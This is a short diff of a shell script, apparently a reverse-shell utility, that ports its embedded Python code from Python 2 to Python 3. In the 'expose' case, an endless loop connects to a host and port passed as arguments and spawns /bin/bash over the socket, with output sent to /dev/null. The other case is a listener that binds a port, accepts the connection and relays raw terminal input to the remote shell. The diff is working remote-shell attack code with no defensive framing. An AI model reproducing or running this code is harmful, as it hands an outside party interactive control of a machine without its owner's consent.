@@ -7,7 +7,7 @@
 
   expose)
     while [ 1 ] ; do
-      python -c "import socket, pty, os
+      python3 -c "import socket, pty, os
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((socket.gethostbyname('$2'), $3))
 os.dup2(s.fileno(), 0)
@@ -25,24 +25,26 @@ pty.spawn('/bin/bash')" >> /dev/null 2>&1
     sizes=$(stty size)
     rows=$(echo $sizes | awk '{print $1}')
     columns=$(echo $sizes | awk '{print $2}')
-    python -c "import socket, os, tty, termios, thread
+    python3 -c "import socket, os, tty, termios, threading
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.bind((socket.gethostbyname('$2'), $3))
 s.listen(128)
 c, a = s.accept()
-c.send('stty rows $rows columns $columns\n')
+c.send(b'stty rows $rows columns $columns\n')
 def hear():
-    while True:
-        os.write(1, c.recv(1))
-thread.start_new_thread(hear, tuple())
-old_sett = termios.tcgetattr(0)
+  while True:
+    os.write(1, c.recv(1))
+t = threading.Thread(target=hear)
+t.daemon = True
+t.start()
+oset = termios.tcgetattr(0)
 tty.setraw(0)
 while True:
   try:
     c.send(os.read(0, 1))
   except:
     break
-termios.tcsetattr(0, termios.TCSADRAIN, old_sett)"
+termios.tcsetattr(0, termios.TCSADRAIN, oset)"
     ;;
 
 
